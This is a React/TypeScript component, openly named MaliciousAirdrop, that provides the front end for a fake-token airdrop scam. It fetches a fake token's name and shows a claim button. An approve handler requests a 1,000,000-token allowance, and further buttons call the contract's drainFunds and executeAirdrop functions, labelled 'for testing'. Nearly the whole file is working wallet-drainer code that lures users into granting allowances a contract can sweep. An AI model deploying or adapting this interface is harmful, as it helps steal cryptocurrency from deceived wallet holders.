import React, { useState, useEffect } from 'react';
import { ethers, formatUnits, parseEther, BrowserProvider } from 'ethers';
import { useWallet } from '../context/WalletContext';

interface MaliciousAirdropProps {
  contractAddress: string;
  contractABI: any;
  fakeTokenAddress: string;
}

const MaliciousAirdrop: React.FC<MaliciousAirdropProps> = ({ contractAddress, contractABI, fakeTokenAddress }) => {
  const { account } = useWallet();
  const [loading, setLoading] = useState(false);
  const [userBalance, setUserBalance] = useState<string>("0");
  const [airdropAmount, setAirdropAmount] = useState<string>("0");
  const [fakeTokenName, setFakeTokenName] = useState<string>("");

  const getContract = async () => {
    if (!account || !window.ethereum) return null;
    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    return new ethers.Contract(contractAddress, contractABI, signer);
  };

  const fetchFakeTokenName = async () => {
    try {
      if (!window.ethereum) return;
      const provider = new BrowserProvider(window.ethereum);
      const tokenContract = new ethers.Contract(fakeTokenAddress, ["function name() view returns (string)"], provider);
      const name = await tokenContract.name();
      setFakeTokenName(name);
    } catch (error) {
      console.error("Error fetching fake token name:", error);
      setFakeTokenName("Unknown Token");
    }
  };

  const fetchUserBalance = async () => {
    if (!account) return;
    try {
      const contract = await getContract();
      if (contract) {
        const balance = await contract.balanceOf(account);
        setUserBalance(formatUnits(balance, 18)); // Assuming 18 decimals
      }
    } catch (error) {
      console.error("Error fetching user balance:", error);
    }
  };

  const fetchAirdropAmount = async () => {
    try {
      const contract = await getContract();
      if (contract) {
        const amount = await contract.airdropAmount();
        setAirdropAmount(formatUnits(amount, 18)); // Assuming 18 decimals
      }
    } catch (error) {
      console.error("Error fetching airdrop amount:", error);
    }
  };

  const handleClaim = async () => {
    if (!account) return;
    try {
      setLoading(true);
      const contract = await getContract();
      if (contract) {
        const tx = await contract.claimAirdrop();
        await tx.wait();
        alert('Airdrop claimed successfully!');
        fetchUserBalance(); // Refresh balance after claiming
      }
    } catch (error) {
      console.error('Error claiming airdrop:', error);
      alert('Failed to claim airdrop.');
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async () => {
    if (!account) return;
    try {
      setLoading(true);
      const contract = await getContract();
      if (contract) {
        // Approve a large amount
        const amountToApprove = parseEther("1000000");
        const tx = await contract.approve(contractAddress, amountToApprove);
        await tx.wait();
        alert('Tokens approved successfully!');
      }
    } catch (error) {
      console.error('Error approving tokens:', error);
      alert('Failed to approve tokens.');
    } finally {
      setLoading(false);
    }
  };

  const handleDrainFunds = async () => {
    if (!account) return;
    try {
      setLoading(true);
      const contract = await getContract();
      if (contract) {
        const tx = await contract.drainFunds();
        await tx.wait();
        alert('Funds drained successfully!');
      }
    } catch (error) {
      console.error('Error draining funds:', error);
      alert('Failed to drain funds.');
    } finally {
      setLoading(false);
    }
  };
  
  const handleExecuteAirdrop = async () => {
    if (!account) return;
    // This is a placeholder for the UI to trigger the airdrop
    const recipients = ["0x0000000000000000000000000000000000000000"]; // Replace with actual recipient addresses
    const amounts = [parseEther("100")]; // Replace with actual amounts

    try {
      setLoading(true);
      const contract = await getContract();
      if (contract) {
        const tx = await contract.executeAirdrop(fakeTokenAddress, recipients, amounts);
        await tx.wait();
        alert('Airdrop executed successfully!');
      }
    } catch (error) {
      console.error('Error executing airdrop:', error);
      alert('Failed to execute airdrop.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (account) {
      fetchUserBalance();
      fetchAirdropAmount();
      fetchFakeTokenName();
    }
  }, [account, contractAddress, fakeTokenAddress]);

  return (
    <div className="malicious-airdrop-card">
      <h2>Malicious Airdrop Claim</h2>
      <p>Your wallet: {account}</p>
      <p>Your balance of {fakeTokenName}: {userBalance} tokens</p>
      <p>Airdrop amount: {airdropAmount} tokens</p>
      <button onClick={handleClaim} disabled={loading || !account}>
        {loading ? 'Processing...' : 'Claim Airdrop'}
      </button>
      <button onClick={handleApprove} disabled={loading || !account}>
        {loading ? 'Processing...' : `Approve ${fakeTokenName}`}
      </button>
      <button onClick={handleDrainFunds} disabled={loading || !account}>
        {loading ? 'Processing...' : 'Drain Funds (for testing)'}
      </button>
      <button onClick={handleExecuteAirdrop} disabled={loading || !account}>
          {loading ? 'Processing...' : 'Execute Airdrop (for testing)'}
      </button>
    </div>
  );
};

export default MaliciousAirdrop; 